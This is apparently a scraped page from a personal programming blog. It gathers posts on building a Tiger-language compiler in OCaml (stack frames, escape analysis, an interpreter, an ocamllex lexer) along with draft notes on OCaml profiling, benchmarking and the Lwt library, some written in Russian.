type access = (* memory location at the specific offset from the frame pointer *) | InFrame of int (* register location *) | InReg of Temp.t [@@deriving show] The rest of the Frame module implementation:
(* creates a new location for a formal parameter or a local variable, given its index and [esc] flag *) let mk_access i = function | true -&gt; InFrame ((i &#43; 1) * (-word_size)) (* escapes - alloc in frame *) | false -&gt; InReg (Temp.mk ()) (* doesn&#39;t escape - use temp (register) *) (* makes a new stack frame *) let mk label formals = let formals = List.mapi mk_access formals in let locals = ref 0 in (* don&#39;t know yet what instructions we need, so just leave it empty for now *) let instrs = [] in { label; formals; locals; instrs } let formals { formals; _ } = formals (* local variables that do not escape can be allocated in a register, escaping variables must be allocated in the frame *) let alloc_local { locals; _ } = function | true -&gt; incr locals; let offset = (!locals &#43; 1) * (-word_size) in InFrame offset | false -&gt; InReg (Temp.mk ()) alloc_local allocates a new local variable in the given frame or in a register. The boolean argument specifies whether the new variable escapes and needs to go in the frame. Returns in-memory access with an offset from the frame pointer.
alloc_local t true : → InFrame -4
alloc_local t true : → InFrame -8
alloc_local t false : → InReg t1
alloc_local t false : → InReg t2
A clever compiler might optimize the frame size by noticing when two frame-resident variables could be allocated to the same slot.
Temporaries and labels
We need a couple of more abstractions to represent a “not known yet” register and machine-language locations:
Temporary – an abstract name for a value that is temporarily held in some register Label (just like label in assembly language) – an abstract name for a static machine-language location whose exact address is yet to be determined The Temp module manages these two distinct sets of names:
(** Abstract name for a local variable that is temporarily held in a register *) type t [@@deriving show] (** Abstract name for a static memory address that is yet to be determined *) type label [@@deriving show] (** Returns a new temporary from an infinite set of temporaries *) val mk : unit -&gt; t (** Returns a new [label], whose assembly-language name is the given string (if given), otherwise it is generated. *) val mk_label : string option -&gt; label The implementation of the Temp module:
module S = Symbol type t = int [@@deriving show] type label = Symbol.t [@@deriving show] let mk = let idx = ref (-1) in fun () -&gt; incr idx; !idx let mk_label name = let idx = ref (-1) in match name with | Some s -&gt; S.symbol s | None -&gt; incr idx; let name = string_of_int !idx in S.symbol name View shift
Function arguments are seen differently by the caller and the callee. In the book this is referred to as the view shift. For example, a caller my put a parameter into register \(r_6\), but the callee may want to access it from register \(r_9\). We want to handle this view shift in the Frame module.
For each formal parameter we should calculate:
How it will be seen by callee (in a register, or in a frame location) What instructions are required to implement this view shift To keep things simple, we are not going to implement this right now.
Static links
The Frame module should not know anything about static links, because we want it be independent of any specific source language being compiled. We’ll use Translate module to manage static links.
The static link (which is a pointer to the enclosing function) is passed to a function in a register and stored into the frame, just like any other escaping formal parameter. So we will treat it as one by adding another true value at the front the list of booleans representing formal parameters. It means that for some function f(x,y) (assuming neigher x nor y escapes) we’ll have the following list:
[true; false; false] Notice the extra true at the beginning.
Translate module
The Translate module handles the notion of nested scopes (via static links), providing the interface to the Semant module.
We separate Semant from Translate module to avoid a huge, unweildy module that does both: type checking and semantic translation.
Ok, I think at this point we are ready to write some initial implementation:
type expr = unit (** Represents a nesting level *) type level (** Describes a way to access a formal parameter or a local variable. Basically, it is just a [Frame.access] plus a nesting [level] *) type access = level * Frame.access (** Outermost level at which all top-level functions and variables are declared *) val outermost : level (** Creates a new &#34;nesting level&#34; for a function *) val mk : level option -&gt; Temp.label -&gt; bool list -&gt; level (** Extracts a list of accesses *) val formals : level -&gt; access list (** Creates an [access] at the given [level]. The argument [bool] specifies whether the variable escapes *) val alloc_local : level -&gt; bool -&gt; access We don’t know yet what the expr will be, thats why it is a type alias for unit. And here is the basic implementation:
type expr = unit [@@deriving show] type level = { parent: level option; frame: Frame.t } [@@deriving show] type access = level * Frame.access let outermost = let label = Temp.mk_label None in { parent = None; frame = Frame.mk label []; } let mk parent label formals = let formals = true :: formals in let frame = Frame.mk label formals in { parent; frame } (* Returns formals (excluding the static link) *) let formals lev = (* exclude the SL *) let args = List.tl (Frame.formals lev.frame) in List.map (fun access -&gt; lev, access) args let alloc_local lev esc = let access = Frame.alloc_local lev.frame esc in lev, access Notice the formals = true :: formals in the mk function, it is there to represent a static link.
Env
We must keep the Translate.level along with the Temp.label in the FunEntry. Also we need to update the VarEntry to include the Translate.access.
Here is how our updated Env module looks like:
module T = Type module Table = Symbol.Table type access (** Variable entry *) type var_entry = { access: Translate.access; (** Describes how to access the variable **) ty: T.t (** Type of the variable *) } (** Function entry *) type fun_entry = { level: Translate.level; (** Nesting level *) label: Temp.label; (** Label of the machine-code entry point *) formals: T.t list; (** Types of the formal parameters *) result: T.t (** Type of the result returned by the function **) } (** Term-level entry *) type entry = | VarEntry of var_entry | FunEntry of fun_entry (** Contains bindings for predefined functions *) val base_venv : entry Table.t (** Predefined types *) val base_tenv : T.t Table.t Escapes
To calculate which variables should be stored in registers and which should be allocated in the frame we’ll have a special module named Escape.
Here its interface in OCaml:
(** Depth (nesting level) of the function that contains the variable declaration *) type depth (** Environment that maps variables to pairs of depth and a reference to a boolean flag indicating if a particular variable escapes *) type env = (depth * bool ref) Symbol.Table.t (** Looks for escaping variables and records this info in the [escape] fields of the abstract syntax *) val traverse_prog : Syntax.expr -&gt; unit The traverse_prog function is going to traverse the entire AST looking for escaping uses of every variable. Also, we’ll have a separate environment env to track “escaping” of variables.
Whenever a variable or formal-parameter declaration \(a\) is found at static function-nesting depth \(d\) then a new binding (d, ref false) is entered into the environment env. This new environment is used in processing expressions within the scope of the variable. Then whenever this var or formal-parameter \(a\) is used at depth \(\gt d\) (which means that it escapes), then our “escape ref” is set to true in the environment.
This should take place before semantic analysis, because the Semant module needs to know about escaping variables to do it’s work.
Semant
Now lets go and update our Semant module.
I won’t paste the whole implementation, the code is here.
Haskell @haskellhaskell Link to heading TODO A week of Liquid Haskell @liquid-haskellliquid-haskellrefinement-types Link to heading In this post I’ll share my experience of playing around with Liquid Haskell for about a week.
TODO Building a toy Ethereum-like VM in Haskell compilersethereumvm Link to heading TODO Writing a simple trading bot in Haskell trading Link to heading Some time ago I was interested in trading blah blah.
TODO Notes on parallel &amp; concurrent programming in Haskell Link to heading \begin{equation} \label{eq:1} C = W\log_{2} (1&#43;\mathrm{SNR}) \end{equation}
See: http://www.jmilne.org/not/Mamscd.pdf
\(\require{AMScd}\)
\begin{CD} K(X) @&gt;{ch}» H(X;\mathbb Q);\\ @VVV @VVV \\ K(Y) @&gt;{ch}» H(Y;\mathbb Q); \end{CD}
OCaml @ocamlocaml Link to heading DRAFT Instrumenting and profiling OCaml programs benchmarkingprofilingperformance Link to heading Intro Link to heading Profiling is rather a large topic, but basically it allows us to learn where the program spent its time and which functions called which other functions during its execution. We use that information to understand which pieces of our program are slower than we expected.
Note the difference between profiling and benchmarking: we use (micro-)benchmarking to estimate the cost of executing an individual isolated pieces of code, but we use profiling to understand to properties of the whole program and possibly find the hot spots.
Usually profiling is achieved by instrumenting either the program source code or its binary executable. Instrumentation means adding some extra code to collect the required information (for example, where it was called from), which may cause significant performance changes. This is why code should only execute if some special flag is set (like --profile / -p).
Here are some known instrumentation types according to the Wikipedia:
Manual – performed by the programmer by adding extra code to measure execution costs Automatic source level – instrumentation added to the source code by an automatic tool according to an instrumentation policy Interpreter instrumentation – interpreter debug option can enable the collection of performance metrics as the interpreter encounters each target statement Intermediate language – instrumentation added to assembly or byte code Binary translation – the tool adds instrumentation to a compiled executable Compiler assisted Runtime instrumentation and injection In this post we are going to take a closer look only at the manual instrumentation and the interpreter instrumentation in a context of the OCaml language and its ecosystem.
Typically profiling includes the following steps:
Compiling (or just running) a program with profiling enabled Executing it to generate profile data Analyzing profile data to find bottlenecks We also may want to consider the output format. Generally these forms may be available for the analysis:
Flat – Shows the average call times for each function and how much time spent executing that function. Output is in the form of a table, rows are usually sorted by decreasing time spent and a number of calls, then alphabetically by name. Here is the more detailed description with an example Call-graph – Includes call-chains involved. Helps to find functions that call other functions that spend unusual amounts of time. Again, there is a good example in gprof docs Annotated source – Lists the program source code annotated with the number of times each line of the program was executed (see an example in gprof docs) Input-sensitive – Additionally shows how an application’s performance scales as a function of its input Tools Link to heading There are several profiling tools available in OCaml ecosystem.
core_profiler
Library made by Jane Street that helps you profile programs and estimate various costs. It belongs to the Core ecosystem, which is good, but looks like it’s poorly documented. Here is the post describing this library and the docs (with usage examples).
landmarks
The tool made by LexiFi. Personally I haven’t tried it, but it looks good.
References Link to heading Statistical memory profiling:
http://ocaml.org/meetings/ocaml/2016/Jourdan-statistically_profiling_memory_in_OCaml.pdf https://www.youtube.com/watch?v=wX4m8yqbuqE Summary Link to heading Unfortunately this post is not finished :P
DRAFT Benchmarking OCaml code benchmarkingperformance Link to heading The most known tool for benchmarking OCaml code is the Core_bench by Jane Street. There is a post about it in the Jane Street tech blog that should help to get started, but it may be a bit outdated.
Here is the basic usage:
open Core open Core_bench module B = Bench.Test let benchmarks = let x = Random.float 10.0 in let y = Random.float 10.0 in [ B.create ~name: &#34;Float add&#34; (fun () -&gt; ignore (x &#43;. y)) ; B.create ~name: &#34;Float mul&#34; (fun () -&gt; ignore (x *. y)) ; B.create ~name: &#34;Float div&#34; (fun () -&gt; ignore (x /. y)) ] let () = let cmd = Bench.make_command benchmarks in Command.run cmd DONE Заметка о Lwt lwt Link to heading Что такое Lwt Link to heading Lwt это одна из наиболее популярных OCaml библиотек, разрабатываемая сообществом. По сути это просто реализация кооперативной многозадачности (как альтернативы вытесняющей многозадачности) в OCaml на основе Promises.
В дальнейшем я буду использовать слова “поток” и промис как взаимозаменямые.
Виды “многозадачностей” Link to heading Этот параграф можно пропустить
Если в двух словах, то вытесняющую и кооперативную многозадачность можно объяснить следующим образом:
Вытесняющая многозадачность означает, что у нас есть некий планировщик, принимающий решения о том, когда будет выполняться какой поток, обычно принимая во внимание приоритет потоков и выделяя им некие кванты времени. Этот вид многозадачности используется в большинстве современных ОС.
Кооперативная многозадачность – планировщик не принимает решение о переключении потоков. Поток должен явно сигнализировать о том, что он готов прерваться и предоставить процессорное время другим потокам.
Асинхронное программирование с Lwt и промисы Link to heading Lwt предоставляет нам тип данных &#39;a Lwt.t. Можно относиться к нему, как к “потоку”. Это обычный промис, содержащий некоторое значение типа &#39;a, которое может быть вычислено, например, когда-то в будущем, но только один раз. В терминах OCaml это просто &#39;a ref, который будет заполнен позже. Изначально значения в нём нет и промис находится в состоянии Sleep (pending). Когда вычисление завершено успешно, Lwt помещает результат типа &#39;a в наш промис и его состояние становится Return (resolved). В случае же неудачи его состояние изменяется на Fail (rejected) и в него помещается произошедшая ошибка.
API
Вот как выглядит тип, описывающий состояния:
type &#39;a state = | Return of &#39;a | Fail of exn | Sleep Lwt предоставляет несколько полезных ф-ций:
val return : &#39;a -&gt; &#39;a Ltw.t Понятно, что эта ф-ция тривиально упаковывает уже известно значение в промис. Соответственно, этот промис сразу находится в состоянии Return (resolved).
Значения, упакованные в Lwt.t, не могут быть просто извлечены (т.к. вычисление может быть ещё не завершено). Для этого мы должны использовать оператор bind:
val (&gt;&gt;=): &#39;a Lwt.t -&gt; (&#39;a -&gt; &#39;b Lwt.t) -&gt; &#39;b Lwt.t Такая конструкция позволяет нам делать композицию промисов в “монадическом” стиле.
f &gt;&gt;= g создаст нам промис, который ждёт пока завершится “поток” f : &#39;a Lwt.t, получает результат его вычислений (некий x : &#39;a) и передаёт его в ф-цию g : &#39;a -&gt; &#39;b Ltw.t, которая запускает поток &#39;b Ltw.t. Если f находится в состоянии pending, то и f &gt;&gt;= g будет в состоянии pending. Соответственно, если f завершится с ошибкой, то и f &gt;&gt;= g завершится с той же самой ошибкой.
Несколько других полезных ф-ций:
val join : unit Lwt.t list -&gt; unit Lwt.t join получает список потоков и ожидает пока они все завершатся. Если хотя бы один из них завершится с ошибкой (перейдёт в состояние rejected), то и результирующий поток завершится с той же ошибкой (после того, как все остальные потоки завершат свои вычисления).
val choose : &#39;a t list -&gt; &#39;a t choose ждёт пока выполнится хотя бы один поток. Если таких оказалось несколько, то в качестве результата выбирается один из них cлучайным образом.
На самом деле их огромное множество и все их можно найти тут.
PPX
У нас есть следующий синтаксический сахар:
let%lwt i = f () in ... Что эквивалентно следующему фрагменту:
Lwt.bind (f ()) (fun i -&gt; ...) Примеры
Следующие примеры я взял из официального туториала
Чтение из STDIN без Lwt, выполнение блокируется пока не поступит пользовательский ввод:
let () = let line : string = Pervasives.read_line () in print_endline &#34;Now unblocked!&#34;; ignore line С промисами Lwt выполнение продолжается:
let () = let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in print_endline &#34;Execution just continues...&#34;; ignore line_promise В данном случае это не совсем то, что нам нужно, т.к. программа сразу завершает работу так и не дождавшись пользовательского ввода. Чтобы заблокироваться и подождать пока промис выполнится мы можем использовать ф-цию Lwt_main.run:
let () = let line_promise : string Lwt.t = Lwt_io.(read_line stdin) in print_endline &#34;Execution just continues...&#34;; let line : string = Lwt_main.run line_promise in ignore line Lwt_main.run используется только 1 раз, чтобы подожать пока завершится промис самого верхнего уровня. Когда этот промис выполнится, программа завершает работу.
Ещё примеры:
Опять же, я не заморачивался и взял примеры из официального туториала, тк я слишком ленивый, чтобы придумывать их самому.
Пример функции, которая печатает “tic” каждую секунду, не блокируя другие “потоки”:
let rec tic () = print_endline &#34;tic&#34;; let%lwt () = Lwt_unix.sleep 1.0 in tic () Пример запуска нескольких “потоков” и ожидание их результатов.
Допустим у нас есть пара ф-ций f и g:
val f : unit -&gt; unit Lwt.t val g : unit -&gt; unit Lwt.t Следующий код запустит их вычисления последовательно:
let%lwt () = f () in let%lwt () = g () in ... А вот так мы можем запустить обе ф-ции конкурентно и сразу же подождать их завершения:
let p1 = f () in let p2 = g () in let%lwt () = p1 in let%lwt () = p2 in ... Пример ф-ции, которая выполняет все вычисления из списка конкрурентно:
let rec map f l = match l with | [] -&gt; Lwt.return [] | v :: r -&gt; let t = f v in let rt = map f r in let%lwt v&#39; = t in let%lwt l&#39; = rt in Lwt.return (v&#39; :: l&#39;) Следующая ф-ция наоборот, ожидает пока выполнится каждое предыдущее вычисление из списка, прежде чем запустить следующее:
let rec map_serial f l = match l with | [] -&gt; return [] | v :: r -&gt; let%lwt v&#39; = f v in let%lwt l&#39; = map_serial f r in Lwt.return (v&#39; :: l&#39;) Конечно, это только самые “вершки” Lwt.
Полезные ссылки Link to heading Promises в книге Functional Programming in OCaml Lwt Gitter Туториал Lwt in 5 minutes Lwt мануал Туториал про то, как сделать простой сервер на сокетах, позволяющий клиентам подключаться, увеличивать счётчик и читать его значение. Emacs @emacsemacs Link to heading DRAFT My first Emacs package: ormolu.el ormolu Link to heading Intro Link to heading I’ve been using Emacs on a daily basis for about 2 years already,
Ormolu is an opinionated zero-configuration formatter for Haskell source code built in Tweag.
DRAFT Writing an Emacs major mode for the Tiger language Link to heading References Link to heading There is a really good tutorial by Xah Lee: Emacs Lisp How to Write Major Mode, which I highly recommend reading.
Formal Methods Link to heading Theorem Provers Link to heading :@theorem_provers:theorem_provers:
Designing a Theorem Prover, Part 1 folderol Link to heading Table of Contents Making of Tiger:@compilers:compilers🐯ocaml: DONE Making of Tiger #1, Intro DONE Making of Tiger #2, Lexical Analysis:lexing:ocamllex: DONE Making of Tiger #3, Parsing:parsing:menhir: DRAFT Making of Tiger #4, Abstract Syntax:ast: TODO Making of Tiger #5, Semantic Analysis:type_checking: DONE Making of Tiger #6, Stack frames:stack:memory: Haskell:@haskell:haskell: TODO A week of Liquid Haskell:@liquid_haskell:liquid_haskell:refinement_types: TODO Building a toy Ethereum-like VM in Haskell:compilers:ethereum:vm: TODO Writing a simple trading bot in Haskell:trading: TODO Notes on parallel &amp; concurrent programming in Haskell OCaml:@ocaml:ocaml: DRAFT Instrumenting and profiling OCaml programs:benchmarking:profiling:performance: DRAFT Benchmarking OCaml code:benchmarking:performance: DONE Заметка о Lwt:lwt: Emacs:@emacs:emacs: DRAFT My first Emacs package: ormolu.el:ormolu: DRAFT Writing an Emacs major mode for the Tiger language Formal Methods Theorem Provers Coq:@coq:coq: Notes on Coq and Ssreflect:ssreflect: Proving TAPL in Coq:tapl: DONE Заметки про типы в Coq (WIP) Rust:@rust:rust: DONE Зелёные потоки в 200 строчек на Rust. Часть 1:@arm64: Assembly:@assembly:assembly: DONE Программирование для ARM64. Часть 1:@arm64: Blockchain:@blockchain:blockchain: Who to follow Hahacks EVM:@evm:@solidity:evm:solidity: Ethereum Security Audit My path to blockchain security audit:security: CTF walkthrough:@ctf:ctf:security: This is a summary.">

<meta property="og:url" content="https://vyorkin.org/posts/posts/">
  <meta property="og:site_name" content="vyorkin.org">
  <meta property="og:title" content="vyorkin.org">
  <meta property="og:description" content=" Making of Tiger @compilerscompilerstigerocaml Link to heading DONE Making of Tiger #1, Intro Link to heading Recently I’ve started reading the book by Andrew W. Appel titled Modern compiler implementation in ML. I’ve picked it up because I’ve heard some really good reviews about the ML version of it. Also there are other editions available that use C and Java. Each chapter covers a single phase of the compilation process and comes with some initial ML code and programming excercies. At the end you will have a working optimizing compiler.
I’m building a compiler for the first time and it is a lot of fun. In these blog post series, I’ll be working through the book and explaining my solutions to each chapter.
Getting started Link to heading The author describes Tiger as a simple (but nontrivial) language of the Algol family, which could be easily modified to be functional or object-oriented (maybe I’ll skip the OO-part of the book).
Here is an example program in Tiger type tree = { key: string, left: tree, right: tree } function prettyprint(tree: tree) : string = let var output := &#34;&#34; function write(s: string) = output := concat(output, s) function show(n: int, t: tree) = let function indent(s: string) = ( for i := 1 to n do write(&#34; &#34;); output := concat(output, s); write(&#34;\n&#34;) ) in if t = nil then ident(&#34;.&#34;) else ( indent(t.key); show(n &#43; 1, t.left); show(n &#43; 1, t.right) ) end in show(0, tree); output end For my implementation I’ve decided to use OCaml. It is close enough to SML so with even basic ML experience it should be fairly straightforward to port the code examples.
Straight-line programs
The first “warm-up” assignment is to implement a program analyzer and interpreter for the straight-line programming language. We have the following types:
type id = string type binop = Plus | Minus | Times | Div type stm = Compound of stm * stm | Assign of id * exp | Print of exp list and exp = Id of id | Num of int | Op of exp * binop * exp | Eseq of stm * exp So for the following sample straight-line program
a := 5 &#43; 3; b := (print(a, a - 1), a * 10); print(b) The corresponding AST would be
Compound( Assign(&#34;a&#34;, Op(Num 5, Plus, Num 3)), Compound( Assign(&#34;b&#34;, Eseq( Print [Id &#34;a&#34;; Op(Id &#34;a&#34;, Minus, Num 1)], Op(Num 10, Times, Id &#34;a&#34;))), Print [Id &#34;b&#34;])) The first task is to write a function
val maxargs : stm -&gt; int This function tells the maximum number of args of any print statement within any subexpression of a given statement.
Sounds easy, right? The implementation is pretty straightforward too:
open Base open Straightline let rec maxargs stm = let maxargs_exp = function | Eseq (stm, _) -&gt; maxargs stm | _ -&gt; 0 in match stm with | Print exps -&gt; let len = List.length exps in let exp_lens = List.map ~f:maxargs_exp exps in let max_exp_len = List.max_elt ~compare:Int.compare exp_lens in Int.max len (Option.value ~default:0 max_exp_len) | Compound (exp1, exp2) -&gt; let l1 = maxargs exp1 in let l2 = maxargs exp2 in Int.max l1 l2 | Assign (_, exp) -&gt; maxargs_exp exp Next, we need to write another function that “interprets” program in this language.
val eval : stm -&gt; unit A simple interpreter could look like this:
open Base open Stdio open Straightline let eval x op y = match op with | Plus -&gt; x &#43; y | Minus -&gt; x - y | Times -&gt; x * y | Div -&gt; x / y let rec interp_stm stm env = let print env0 exp = let (v, env1) = interp_exp exp env0 in print_endline (Int.to_string v); env1 in match stm with | Print exps -&gt; List.fold_left ~init:env ~f:print exps | Assign (key, exp) -&gt; let (data, env1) = interp_exp exp env in Map.set env1 ~key ~data | Compound (stm1, stm2) -&gt; let env1 = interp_stm stm1 env in interp_stm stm2 env1 and interp_exp exp env = match exp with | Id k -&gt; let v = Map.find_exn env k in (v, env) | Num x -&gt; (x, env) | Op (exp1, op, exp2) -&gt; let (x, env1) = interp_exp exp1 env in let (y, env2) = interp_exp exp2 env1 in let r = eval x op y in (r, env2) | Eseq (stm, exp) -&gt; let env1 = interp_stm stm env in interp_exp exp env1 Here we’re just recursively traversing a tree, keeping a map of identifiers, evaluating arithmetic operations and printing values.
Excersises Link to heading A couple of more excercises about trees, nothing super exciting. So I won’t paste the rest of my solutions here. To implement a balanced-tree (ex. d) I’ve read the chapter about Red-Black Trees in Okasaki book. The code is here.
Well, thats all for part 1! The next one is about lexical analysis where we’ll write a simple lexer for the Tiger language.
Conclusion Link to heading By the time I’ve decided to start writing this post I’ve already finished reading 6th chapter and here are some first impressions:
The book is clear and enjoyable to read. Programming assignments and exercises are well thought out Implementing the typechecker (chapter 5) wasn’t easy, for me it took a week to make it work and typecheck correctly every given example program Chapter 6 feels easier (less code to write), but requires some basic knowledge about microprocessor architectures (SPARK, MIPS) I wouldn’t recommend starting with this book to someone with zero compiler design knowledge. But it is definitely a must read for people who already know the basics of compiler construction.
DONE Making of Tiger #2, Lexical Analysis lexingocamllex Link to heading Intro Link to heading We need a way to translate a program written in one (human-friendly) language to another (machine-specific) language. Generally, this work is splitted into 2 parts: analysis and synthesis.
The synthesis-part (back end) is responsible for the code generation and optimizations.
Analysis-part (front end) is responsible for breaking the program apart to understand its structure and meaning. There are 3 commonly used analysis phases:
Lexical – breaking a sequence of characters into sequence of individual tokens (words) Syntax – parsing and checking that we have a valid sequence of tokens Semantic – gathering the program’s meaning, making sure that declarations and statements of program are semantically correct, this usually includes type checking In this post we’ll focus on implementing the lexical analysis phase.
A lexical token is a string with an assigned and identified meaning. This is a unit in a grammar of a programming language.
Example tokens: identifiers, keywords, separators, operators Example non-tokens: white-spaces, tabs, newlines, comments, preprocessor directives, macroses Now, I’m going to skip everything related to finite automata and regular expressions and go straight to the implementation of lexer (lexical analyzer). You can find a good intro to lexing and parsing using ocamllex and menhir in the Read World OCaml book.
Example lexer (morse code) Link to heading We’ll start with the simplest possible example of building a lexer for morse code, the full source code is here.
The dune file for our playground project is going to look like this:
(ocamllex (modules lexer)) (executable (name driver) (libraries core stdio) (preprocess (pps ppx_deriving.show))) (env (dev (flags (:standard -warn-error -A)))) Nothing fancy here. Next one is the driver.ml module, this is our entry point. It simply reads the given file, runs our lexer and displays the resulting S-expression.
open Core open Syntax let rec tokens buf = match Lexer.read buf with | EOF -&gt; [EOF] | tok -&gt; tok::tokens buf let lex_print ch = ch |&gt; Lexing.from_channel |&gt; tokens |&gt; List.iter ~f:(fun e -&gt; Format.printf &#34;%s\n&#34; (show_exp e)) let run filename () = In_channel.with_file filename ~f:lex_print let () = let spec = Command.Spec.(empty &#43;&gt; anon (&#34;filename&#34; %: string)) in run |&gt; Command.basic_spec ~summary:&#34;Run the lexer and display tokens&#34; spec |&gt; Command.run We need a module to describe our tokens, lets call it syntax.ml:
type exp = | SYM of string (* symbol *) | SEP (* separator *) | EOF (* end of file *) [@@deriving show] And the lexer generator itself:
{ open Lexing open Syntax (* Custom exception type for lexer errors *) exception SyntaxError of string } (* Regular expressions: *) (* We use whitespace as a separator, so it is a valid token in our language *) let white = [&#39; &#39; &#39;\t&#39;]&#43; let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34; let sym = [&#39;.&#39; &#39;-&#39;]&#43; (* Lexing rules: *) rule read = parse (* New lines are separators too *) | newline { new_line lexbuf; SEP } | sym { SYM (lexeme lexbuf) } | white { SEP } | _ { raise (SyntaxError (Printf.sprintf &#34;At offset %d: unexpected character.\n&#34; (lexeme_start lexbuf))) } | eof { EOF } Now we can parse the “hello world” sequence written in Morse Code:
.... . .-.. .-.. --- .-- --- .-. .-.. -.. The output will be:
(SYM &#34;....&#34;) SEP (SYM &#34;.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;---&#34;) SEP (SYM &#34;.--&#34;) SEP (SYM &#34;---&#34;) SEP (SYM &#34;.-.&#34;) SEP (SYM &#34;.-..&#34;) SEP (SYM &#34;-..&#34;) EOF Tiger lexer Link to heading Having that basic understanding of how to use the ocamllex to build lexers, we can try to build one for our Tiger language.
The dune file is going to remain the same as in the “morse code” example above. There is a Tiger Language Reference Manual in Appendix A of the book where you can find the information about the tokens we need: identifiers, comments, declarations, data types, etc.
For now, we don’t need to define a real AST data type.
The “mock” syntax.ml module would suffice. type exp = | TYPE | VAR | FUNCTION | BREAK | OF | END | IN | NIL | LET | DO | TO | FOR | WHILE | ELSE | THEN | IF | ARRAY | ASSIGN | OR | AND | GE | GT | LE | LT | NEQ | EQ | DIVIDE | TIMES | MINUS | PLUS | DOT | RBRACE | LBRACE | RBRACK | LBRACK | RPAREN | LPAREN | SEMICOLON | COLON | COMMA | STRING of string | INT of int | ID of string | EOF [@@deriving show] We want to focus on the lexer part. First, we might want to open some commonly used modules and define a custom exception type for lexing errors.
{ open Lexing open Syntax open Base exception SyntaxError of string } Next, we need a few regular expressions:
let digit = [&#39;0&#39;-&#39;9&#39;] (* There are no negative integer literals in Tiger *) let int = digit&#43; let frac = &#39;.&#39; digit* let exp = [&#39;e&#39; &#39;E&#39;] [&#39;-&#39; &#39;&#43;&#39;]? int let float = digit* frac? exp? let white = [&#39; &#39; &#39;\t&#39;]&#43; let newline = &#39;\r&#39; | &#39;\n&#39; | &#34;\r\n&#34; According to Appendix A:
An identifier is a sequence of letters, digits and underscores, starting with a letter. Uppercase letters are distinguished from lowercase.
let alphanum = [&#39;a&#39;-&#39;z&#39; &#39;A&#39;-&#39;Z&#39; &#39;0&#39;-&#39;9&#39; &#39;_&#39;] let id = [&#39;a&#39;-&#39;z&#39;] alphanum* Lexing rules.
rule read = parse (* Whitespaces *) | white { read lexbuf } We want to skip the new lines.
| newline { new_line lexbuf; read lexbuf } We have a separate function to read strings (see the implementation below).
| &#39;&#34;&#39; { read_string (Buffer.create 16) lexbuf } Again, according the Appendix A:
A comment may appear between any two tokens. Comments start with /* and end with */ and may be nested.
We’ll have a separate function for reading comments (scroll down to see its code).
| &#34;/*&#34; { read_comment [lexbuf.lex_curr_p] lexbuf } Basic keywords:
| &#34;type&#34; { TYPE } | &#34;var&#34; { VAR } | &#34;function&#34; { FUNCTION } | &#34;break&#34; { BREAK } | &#34;of&#34; { OF } | &#34;end&#34; { END } | &#34;in&#34; { IN } | &#34;nil&#34; { NIL } | &#34;let&#34; { LET } | &#34;array&#34; { ARRAY } We need 4 tokens for loops:
| &#34;do&#34; { DO } | &#34;to&#34; { TO } | &#34;for&#34; { FOR } | &#34;while&#34; { WHILE } Conditionals (if-then-else):
| &#34;else&#34; { ELSE } | &#34;then&#34; { THEN } | &#34;if&#34; { IF } Operators:
(* General *) | &#34;:=&#34; { ASSIGN } (* Logical *) | &#34;|&#34; { OR } | &#34;&amp;&#34; { AND } (* Comparison *) | &#34;&gt;=&#34; { GE } | &#34;&gt;&#34; { GT } | &#34;&lt;=&#34; { LE } | &#34;&lt;&#34; { LT } | &#34;&lt;&gt;&#34; { NEQ } | &#34;=&#34; { EQ } (* Arithmetics *) | &#34;/&#34; { DIVIDE } | &#34;*&#34; { TIMES } | &#34;-&#34; { MINUS } | &#34;&#43;&#34; { PLUS } Separators:
| &#34;.&#34; { DOT } | &#34;{&#34; { LBRACE } | &#34;}&#34; { RBRACE } | &#34;[&#34; { LBRACK } | &#34;]&#34; { RBRACK } | &#34;(&#34; { LPAREN } | &#34;)&#34; { RPAREN } | &#34;;&#34; { SEMICOLON } | &#34;:&#34; { COLON } | &#34;,&#34; { COMMA } Numbers, identifiers, error and EOF handling:
| int { INT (Int.of_string (Lexing.lexeme lexbuf)) } | id { ID (Lexing.lexeme lexbuf) } | _ { raise (SyntaxError (&#34;Unexpected character: &#34; ^ Lexing.lexeme lexbuf)) } | eof { EOF } The rule to match string literals:
and read_string buf = parse (* If we reach the terminating double quote, then * we return the contents of the buffer as a STRING. *) | &#39;&#34;&#39; { STRING (Buffer.contents buf) } (* Handling escape sequences *) | &#39;\\&#39; &#39;\\&#39; { Buffer.add_char buf &#39;\\&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;/&#39; { Buffer.add_char buf &#39;/&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;b&#39; { Buffer.add_char buf &#39;\b&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;f&#39; { Buffer.add_char buf &#39;\012&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;n&#39; { Buffer.add_char buf &#39;\n&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;r&#39; { Buffer.add_char buf &#39;\r&#39;; read_string buf lexbuf } | &#39;\\&#39; &#39;t&#39; { Buffer.add_char buf &#39;\t&#39;; read_string buf lexbuf } | [^ &#39;&#34;&#39; &#39;\\&#39;]&#43; { Buffer.add_string buf (Lexing.lexeme lexbuf); read_string buf lexbuf } | _ { raise (SyntaxError (&#34;Illegal string character: &#34; ^ Lexing.lexeme lexbuf)) } | eof { raise (SyntaxError &#34;String is not terminated&#34;) } The rule to match comments (including nested comments), keeping a list of where comments open:
and read_comment opened = parse (* Opening comment *) | &#34;/*&#34; { read_comment (lexbuf.lex_curr_p::opened) lexbuf } (* Closing comment *) | &#34;*/&#34; { match opened with (* No nested opened comments left, continue parsing. *) | _::[] -&gt; read lexbuf (* Continue parsing comment. *) | _ -&gt; read_comment (List.tl_exn opened) lexbuf } | newline { new_line lexbuf; read_comment opened lexbuf } | _ { read_comment opened lexbuf } (* Unexpected end-of-file. Update the current location to * point to the opening token that wasn&#39;t closed and raise an error. *) | eof { lexbuf.lex_curr_p &lt;- List.hd_exn opened; raise (SyntaxError &#34;Unterminated comment&#34;) } Summary Link to heading We’ve learned some new things, like ocamllex, but overall, it wasn’t too hard to follow the book. The full OCaml source code for the second chapter can be found here. In the next part we’re going to write a parser.
DONE Making of Tiger #3, Parsing parsingmenhir Link to heading Intro Link to heading In this chapter we’re going to build a parser for our Tiger language. First, let’s do a quick recap of some important concepts of the theory behind programming language parsers:
